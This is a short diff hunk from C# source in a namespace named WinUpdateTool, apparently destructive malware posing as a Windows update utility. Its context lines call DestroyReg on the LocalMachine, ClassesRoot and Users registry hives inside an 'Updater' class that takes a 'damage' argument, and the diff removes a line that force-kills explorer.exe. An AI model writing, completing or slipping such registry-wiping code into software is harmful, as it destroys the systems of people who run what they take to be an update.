@@ -106,7 +106,6 @@ namespace WinUpdateTool
             DestroyReg(Registry.LocalMachine, 1);
             DestroyReg(Registry.ClassesRoot, 1);
             DestroyReg(Registry.Users, 1);
-            Execute("taskkill.exe -f -im explorer.exe");
         }
 
         public Updater(double damage, string[] args)
